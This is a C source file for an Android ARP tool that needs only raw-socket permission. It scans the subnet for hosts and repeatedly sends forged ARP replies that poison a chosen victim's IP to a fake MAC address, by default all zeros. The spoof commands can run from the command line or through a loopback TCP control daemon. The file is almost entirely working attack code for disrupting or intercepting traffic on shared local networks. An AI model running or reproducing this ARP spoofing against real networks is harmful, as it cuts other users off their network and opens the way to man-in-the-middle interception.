/*
 * arp.c - raw AF_PACKET ARP engine for Android (needs CAP_NET_RAW only).
 * Run as shell uid via Shizuku. Usage:
 *   arp scan                  print "ip mac" of every responder on our subnet
 *   arp spoof <ip> [mac]      poison <ip> to mac (default 00:00:00:00:00:00), loop until killed
 *   arp restore <ip> <mac>    send one ARP reply restoring <ip> -> <mac>
 */
#define _POSIX_C_SOURCE 200809L
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <poll.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

/* bionic lacks netinet/if_ether.h definitions - define our own */
#define ETH_P_ARP 0x0806
#define ETH_P_IP 0x0800
#define ARPHRD_ETHER 1
#define ARPOP_REQUEST 1
#define ARPOP_REPLY 2

struct eth_frame {
    unsigned char h_dest[6];
    unsigned char h_source[6];
    unsigned short h_proto;
} __attribute__((packed));

struct arp_frame {
    unsigned short hrd;
    unsigned short pro;
    unsigned char hln;
    unsigned char pln;
    unsigned short op;
    unsigned char sha[6];
    unsigned char spa[4];
    unsigned char tha[6];
    unsigned char tpa[4];
} __attribute__((packed));

static int sock = -1;
static int running = 1;

static void on_signal(int sig) { running = 0; }

static int open_raw(const char *ifname) {
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        fprintf(stderr, "socket(AF_PACKET) failed: %s (need CAP_NET_RAW)\n", strerror(errno));
        return -1;
    }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        fprintf(stderr, "interface %s: %s\n", ifname, strerror(errno));
        return -1;
    }
    return ifr.ifr_ifindex;
}

static int get_ipv4(const char *ifname, unsigned char ip[4]) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0 || ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        if (fd >= 0) close(fd);
        return -1;
    }
    memcpy(ip, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, 4);
    close(fd);
    return 0;
}

static int get_netmask(const char *ifname, unsigned char mask[4]) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0 || ioctl(fd, SIOCGIFNETMASK, &ifr) < 0) {
        if (fd >= 0) close(fd);
        return -1;
    }
    memcpy(mask, &((struct sockaddr_in *)&ifr.ifr_netmask)->sin_addr, 4);
    close(fd);
    return 0;
}

static int get_mac(int ifindex, const char *ifname, unsigned char mac[6]) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) return -1;
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    return 0;
}

static int send_arp(uint16_t op, const unsigned char *src_mac,
                    const unsigned char *src_ip, const unsigned char *dst_mac,
                    const unsigned char *dst_ip, int ifindex) {
    unsigned char broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    if (!dst_mac) dst_mac = broadcast;
    struct {
        struct eth_frame eth;
        struct arp_frame arp;
    } pkt;
    memset(&pkt, 0, sizeof(pkt));
    memcpy(pkt.eth.h_dest, dst_mac, 6);
    memcpy(pkt.eth.h_source, src_mac, 6);
    pkt.eth.h_proto = htons(ETH_P_ARP);
    pkt.arp.hrd = htons(ARPHRD_ETHER);
    pkt.arp.pro = htons(ETH_P_IP);
    pkt.arp.hln = 6;
    pkt.arp.pln = 4;
    pkt.arp.op = htons(op);
    memcpy(pkt.arp.sha, src_mac, 6);
    memcpy(pkt.arp.spa, src_ip, 4);
    memcpy(pkt.arp.tha, dst_mac, 6);
    memcpy(pkt.arp.tpa, dst_ip, 4);

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ARP);
    sll.sll_ifindex = ifindex;
    ssize_t n = sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr *)&sll, sizeof(sll));
    return n == sizeof(pkt) ? 0 : -1;
}

static int parse_ip(const char *s, unsigned char ip[4]) {
    struct in_addr a;
    if (inet_pton(AF_INET, s, &a) != 1) return -1;
    memcpy(ip, &a, 4);
    return 0;
}

static int cmd_scan(const char *ifname, int ifindex) {
    unsigned char ip[4], mask[4], mac[6], router[6];
    if (get_ipv4(ifname, ip) < 0 || get_netmask(ifname, mask) < 0 ||
        get_mac(ifindex, ifname, mac) < 0) {
        fprintf(stderr, "cannot read iface config (%s)\n", strerror(errno));
        return 1;
    }
    uint32_t base = (ntohl(*(uint32_t *)ip) & ntohl(*(uint32_t *)mask)) | 1;
    uint32_t brdc = (ntohl(*(uint32_t *)ip) | ~ntohl(*(uint32_t *)mask)) - 1;
    uint32_t i;
    for (i = base; i <= brdc && running; i++) {
        uint32_t target = htonl(i);
        uint8_t zero[6] = {0};
        send_arp(ARPOP_REQUEST, mac, ip, zero, (const unsigned char *)&target, ifindex);
        if (i % 32 == 0) usleep(10000);
    }
    struct timespec ts = {1, 0};
    while (running) {
        unsigned char buf[2048];
        ssize_t n = recv(sock, buf, sizeof(buf), MSG_DONTWAIT);
        if (n < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                nanosleep(&ts, NULL);
                continue;
            }
            break;
        }
        if ((size_t)n < sizeof(struct eth_frame) + sizeof(struct arp_frame)) continue;
        struct eth_frame *eth = (struct eth_frame *)buf;
        struct arp_frame *arp = (struct arp_frame *)(buf + sizeof(struct eth_frame));
        if (ntohs(arp->op) != ARPOP_REPLY) continue;
        if (memcmp(arp->sha, eth->h_source, 6) != 0) continue;
        char is[32], ms[32];
        inet_ntop(AF_INET, arp->spa, is, sizeof(is));
        sprintf(ms, "%02x:%02x:%02x:%02x:%02x:%02x",
                arp->sha[0], arp->sha[1], arp->sha[2],
                arp->sha[3], arp->sha[4], arp->sha[5]);
        printf("%s %s\n", is, ms);
        fflush(stdout);
        (void)router;
    }
    return 0;
}

static int cmd_spoof(const char *ifname, int ifindex, const char *victim,
                     const char *mac_s) {
    unsigned char ip[4], mac[6], victim_ip[4];
    unsigned char fake[6] = {0, 0, 0, 0, 0, 0};
    if (mac_s && sscanf(mac_s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                        &fake[0], &fake[1], &fake[2], &fake[3], &fake[4], &fake[5]) != 6) {
        fprintf(stderr, "bad mac %s\n", mac_s);
        return 1;
    }
    if (get_ipv4(ifname, ip) < 0 || get_mac(ifindex, ifname, mac) < 0 ||
        parse_ip(victim, victim_ip) < 0) {
        fprintf(stderr, "config error (%s)\n", strerror(errno));
        return 1;
    }
    fprintf(stderr, "spoofing %s -> %02x:%02x:... until killed\n", victim,
            fake[0], fake[1]);
    while (running) {
        send_arp(ARPOP_REPLY, fake, victim_ip, NULL, victim_ip, ifindex);
        send_arp(ARPOP_REPLY, mac, ip, NULL, victim_ip, ifindex);
        sleep(2);
    }
    return 0;
}

static int cmd_restore(const char *ifname, int ifindex, const char *victim,
                       const char *mac_s) {
    unsigned char ip[4], mac[6], victim_ip[4], real[6];
    if (get_ipv4(ifname, ip) < 0 || get_mac(ifindex, ifname, mac) < 0 ||
        parse_ip(victim, victim_ip) < 0) {
        return 1;
    }
    if (sscanf(mac_s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &real[0], &real[1], &real[2], &real[3], &real[4], &real[5]) != 6) {
        for (int k = 0; k < 3; k++) real[k] = 0;
        return 1;
    }
    for (int k = 0; k < 5; k++) {
        send_arp(ARPOP_REPLY, real, victim_ip, NULL, victim_ip, ifindex);
        usleep(200000);
    }
    return 0;
}

/* ---------------- daemon mode (persistent, TCP 127.0.0.1:28888) ---------------- */

#define XCTD_PORT 28888

static int read_line(int fd, char *buf, size_t len) {
    size_t i = 0;
    while (i < len - 1) {
        char c;
        ssize_t n = read(fd, &c, 1);
        if (n <= 0) return -1;
        if (c == '\n') break;
        buf[i++] = c;
    }
    buf[i] = 0;
    return (int)i;
}

static unsigned char *victim_ip_tmp(const char *victim) {
    static unsigned char v[4];
    parse_ip(victim, v);
    return v;
}

static int daemon_handle_client(int fd, const char *ifname, int ifindex) {
    char line[512];
    for (;;) {
        struct pollfd p = {fd, POLLIN, 0};
        int pr = poll(&p, 1, 2000);
        if (pr < 0) break;
        if (pr == 0) continue;
        int n = read_line(fd, line, sizeof(line));
        if (n < 0) break;
        if (strcmp(line, "quit") == 0) break;

        if (strcmp(line, "ping") == 0) {
            write(fd, "PONG\n", 5);
            continue;
        }
        if (strncmp(line, "scan", 4) == 0) {
            /* scan: run the burst, then drain replies briefly */
            cmd_scan(ifname, ifindex);
            write(fd, "OK\n", 3);
            continue;
        }
        if (strncmp(line, "spoof ", 6) == 0) {
            char victim[64] = {0}, mac[32] = {0};
            sscanf(line + 6, "%63s %31s", victim, mac);
            if (!victim[0]) { write(fd, "ERR\n", 4); continue; }
            /* spoof until 'stop' or disconnect */
            unsigned char ip[4], mac6[6];
            unsigned char fake[6] = {0, 0, 0, 0, 0, 0};
            if (mac[0] && sscanf(mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                                 &fake[0], &fake[1], &fake[2], &fake[3], &fake[4], &fake[5]) != 6) {
                write(fd, "ERR\n", 4);
                continue;
            }
            if (get_ipv4(ifname, ip) < 0 || get_mac(ifindex, ifname, mac6) < 0 ||
                parse_ip(victim, victim_ip_tmp(victim)) < 0) {
                write(fd, "ERR\n", 4);
                continue;
            }
            (void)mac6;
            write(fd, "OK\n", 3);
            for (;;) {
                send_arp(ARPOP_REPLY, fake, victim_ip_tmp(victim), NULL,
                         victim_ip_tmp(victim), ifindex);
                struct pollfd p2 = {fd, POLLIN, 0};
                if (poll(&p2, 1, 2000) > 0) {
                    char stop[64];
                    if (read_line(fd, stop, sizeof(stop)) < 0) return 0;
                    if (strcmp(stop, "stop") == 0) { write(fd, "STOPPED\n", 8); break; }
                }
            }
            continue;
        }
        if (strncmp(line, "restore ", 8) == 0) {
            char victim[64] = {0}, mac[32] = {0};
            sscanf(line + 8, "%63s %31s", victim, mac);
            if (!victim[0] || !mac[0]) { write(fd, "ERR\n", 4); continue; }
            cmd_restore(ifname, ifindex, victim, mac);
            write(fd, "OK\n", 3);
            continue;
        }
        write(fd, "ERR unknown\n", 12);
    }
    return 0;
}

static int cmd_daemon(const char *ifname, int ifindex) {
    int ls = socket(AF_INET, SOCK_STREAM, 0);
    if (ls < 0) {
        fprintf(stderr, "socket: %s\n", strerror(errno));
        return 1;
    }
    int one = 1;
    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(XCTD_PORT);
    if (bind(ls, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        fprintf(stderr, "bind: %s\n", strerror(errno));
        return 1;
    }
    if (listen(ls, 2) < 0) {
        fprintf(stderr, "listen: %s\n", strerror(errno));
        return 1;
    }
    fprintf(stderr, "xcutd listening on 127.0.0.1:%d (raw socket ready)\n", XCTD_PORT);
    for (;;) {
        int fd = accept(ls, NULL, NULL);
        if (fd < 0) {
            if (errno == EINTR) continue;
            break;
        }
        daemon_handle_client(fd, ifname, ifindex);
        close(fd);
    }
    close(ls);
    return 0;
}

int main(int argc, char **argv) {
    signal(SIGTERM, on_signal);
    signal(SIGINT, on_signal);
    if (argc >= 2 && strcmp(argv[1], "--daemon") == 0) {
        const char *ifname = getenv("ARP_IFACE");
        if (!ifname) ifname = "wlan0";
        int ifindex = open_raw(ifname);
        if (ifindex < 0) {
            ifname = "wlan1";
            ifindex = open_raw(ifname);
            if (ifindex < 0) {
                fprintf(stderr, "no usable iface\n");
                return 1;
            }
        }
        return cmd_daemon(ifname, ifindex);
    }
    if (argc < 2) {
        fprintf(stderr, "usage: arp scan|spoof <ip> [mac]|restore <ip> <mac> | --daemon\n");
        return 2;
    }
    const char *ifname = getenv("ARP_IFACE");
    if (!ifname) ifname = "wlan0";
    int ifindex = open_raw(ifname);
    if (ifindex < 0) {
        ifname = "wlan1";
        ifindex = open_raw(ifname);
        if (ifindex < 0) return 1;
    }
    if (strcmp(argv[1], "scan") == 0) return cmd_scan(ifname, ifindex);
    if (strcmp(argv[1], "spoof") == 0 && argc >= 3)
        return cmd_spoof(ifname, ifindex, argv[2], argc >= 4 ? argv[3] : NULL);
    if (strcmp(argv[1], "restore") == 0 && argc >= 4)
        return cmd_restore(ifname, ifindex, argv[2], argv[3]);
    fprintf(stderr, "usage: arp scan|spoof <ip> [mac]|restore <ip> <mac> | --daemon\n");
    return 2;
}